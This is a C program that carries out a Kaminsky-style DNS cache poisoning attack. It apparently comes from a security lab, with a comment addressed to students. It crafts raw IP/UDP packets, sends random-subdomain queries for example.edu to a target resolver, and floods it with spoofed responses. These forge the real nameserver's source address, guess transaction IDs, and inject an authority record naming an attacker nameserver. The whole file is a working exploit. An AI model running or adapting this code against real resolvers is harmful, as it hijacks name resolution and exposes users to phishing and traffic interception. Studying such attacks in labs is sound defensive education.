#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

struct ipheader
{
    unsigned char      iph_ihl: 4, iph_ver: 4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

// DNS common header
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};

// End of query section
struct dataEnd
{
    unsigned short int  type;
    unsigned short int  class;
};

// helper structure for  NS record
struct NSrecord
{
    unsigned short int type;
    unsigned short int class;
    unsigned short int ttl_l;
    unsigned short int ttl_h;
    unsigned short int datalen;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum = 0;
    for(; isize > 1; isize -= 2)
    {
        cksum += *usBuff++;
    }
    if(isize == 1)
    {
        cksum += *(uint16_t *)usBuff;
    }


    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum = 0;
    struct ipheader *tempI = (struct ipheader *)(buffer);
    struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    tempH->udph_chksum = 0;
    sum = checksum( (uint16_t *)   & (tempI->iph_sourceip) , 8 );
    sum += checksum((uint16_t *) tempH, len);
    sum += ntohs(IPPROTO_UDP + len);
    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

unsigned short csum(unsigned short *buf, int nwords)

{
    unsigned long sum;
    for(sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int dns_poison(char *request_url, char *src_addr, char *dest_addr)
{

    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN); //0 out the buffer

    // build three headers in buffer
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    // fill in fields in dns header
    dns->flags = htons(FLAG_R);
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->NSCOUNT = htons(1);
    dns->ARCOUNT = htons(1);

    
    strcpy(data, request_url);
    int length = strlen(data) + 1;
    
    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);


    char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length); 
    strcpy(ans, request_url);
    int anslength = strlen(ans) + 1;

    struct NSrecord *NSrecord = (struct NSrecord *)(ans + anslength);
    NSrecord->type = htons(1);
    NSrecord->class = htons(1);
    NSrecord->ttl_l = htons(0x00);
    NSrecord->ttl_h = htons(0xD0);
    NSrecord->datalen = htons(4);

    
    char *ansaddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct NSrecord) + anslength);
    strcpy(ansaddr, "\1\1\1\1");
    int addrlen = strlen(ansaddr);

    char *ns = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct NSrecord) + anslength + addrlen);
    strcpy(ns, "\7example\3edu");
    int nslength = strlen(ns) + 1;

    struct NSrecord *nsend = (struct NSrecord *)(ns + nslength);
    nsend->type = htons(2);
    nsend->class = htons(1);
    nsend->ttl_l = htons(0x00);
    nsend->ttl_h = htons(0xD0);
    nsend->datalen = htons(23);

    char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct NSrecord) 
        + anslength + addrlen + sizeof(struct NSrecord) + nslength);
    strcpy(nsname, "\2ns\16dnslabattacker\3net");
    int nsnamelen = strlen(nsname) + 1;

    char *auth_sec = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct NSrecord) 
        + anslength + addrlen + sizeof(struct NSrecord) + nslength + nsnamelen);
   
    
    strcpy(auth_sec, "\2ns\16dnslabattacker\3net");
    int auth_length = strlen(auth_sec) + 1;

    struct NSrecord *auth_end = (struct NSrecord *)(auth_sec + auth_length);
    auth_end->type = htons(1);
    auth_end->class = htons(1);
    auth_end->ttl_l = htons(0x00);
    auth_end->ttl_h = htons(0xD0);
    auth_end->datalen = htons(4);

    char *auth_addr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct NSrecord) 
        + anslength + addrlen + sizeof(struct NSrecord) + nslength + nsnamelen + auth_length + sizeof(struct NSrecord));
    strcpy(auth_addr, "\1\1\1\1");
    int auth_arddrlen = strlen(auth_addr);

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
   
    //build new socket
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd < 0 ) {
        printf("socket error\n");
    } 

    sin.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    sin.sin_addr.s_addr = inet_addr(src_addr); 

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; 

    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) 
        + sizeof(struct dnsheader) + length + sizeof(struct dataEnd) + anslength + sizeof( struct NSrecord) 
        + nslength + sizeof(struct NSrecord) + addrlen + nsnamelen + auth_length + sizeof(struct NSrecord) + auth_arddrlen); 

    //fill the fields in ip header
    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand()); 
    ip->iph_ttl = 110; 
    ip->iph_protocol = 17; 
    ip->iph_sourceip = inet_addr("199.43.135.53"); //hard coded ip for example.edu
    ip->iph_destip = inet_addr(src_addr);

    // fill the fields in udp header
    udp->udph_srcport = htons(53);
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd) 
        + anslength + sizeof( struct NSrecord) + nslength + sizeof(struct NSrecord) + addrlen + nsnamelen + auth_length 
        + sizeof(struct NSrecord) + auth_arddrlen);

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
    {
        printf("error\n");
        exit(-1);
    }

    int count = 0;
    int teansaction_ID = 3000; // start from 3000
    while(count < 500)
    {

        dns->query_id = teansaction_ID + count;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        count++;
    }
    close(sd);
    return 0;
}


int main(int argc, char *argv[])
{

    // This is to check the argc number
    if(argc != 3)
    {
        printf("Invalid parameters!!! \n");
        exit(-1);
    }
    // socket descriptor
    int sd;
    // Buffer to hold the packet
    char buffer[PCKT_LEN];
    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    // data is the pointer points to the first byte of the dns payload
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    dns->flags = htons(FLAG_Q);
    dns->QDCOUNT = htons(1);
    
    strcpy(data, "\5aaaaa\7example\3edu");
    int length = strlen(data) + 1;

    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);


    /* Socket information */

    struct sockaddr_in sin;
    int one = 1;
    const int *val = &one;
    dns->query_id = rand(); // transaction ID for the query packet, use random #


    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);


    if(sd < 0 ) // if socket fails to be created
        printf("socket error\n");



    sin.sin_family = AF_INET;
    sin.sin_port = htons(33333);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]);
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand());
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_sourceip = inet_addr(argv[1]);
    ip->iph_destip = inet_addr(argv[2]);
    //DUP addresses
    udp->udph_srcport = htons(33333);
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
    /*******************************************************************************8
    Tips
    the checksum is quite important to pass the checking integrity. You need
    to study the algorithem and what part should be taken into the calculation.
    !!!!!If you change anything related to the calculation of the checksum, you need to re-
    calculate it or the packet will be dropped.!!!!!
    Here things became easier since I wrote the checksum function for you. You don't need
    to spend your time writing the right checksum function.
    Just for knowledge purpose,
    remember the seconed parameter
    for UDP checksum:
    ipheader_size + udpheader_size + udpData_size
    for IP checksum:
    ipheader_size + udpheader_size
    *********************************************************************************/

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
    {
        printf("error\n");
        exit(-1);
    }

    while(1)
    {


        // This is to generate different query in xxxxx.example.edu
        int charnumber;
        charnumber = 1 + rand() % 5;
        *(data + charnumber) += 1;

        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        sleep(0.5);
        dns_poison(data, argv[2], argv[1]);
    }
    close(sd);

    return 0;

}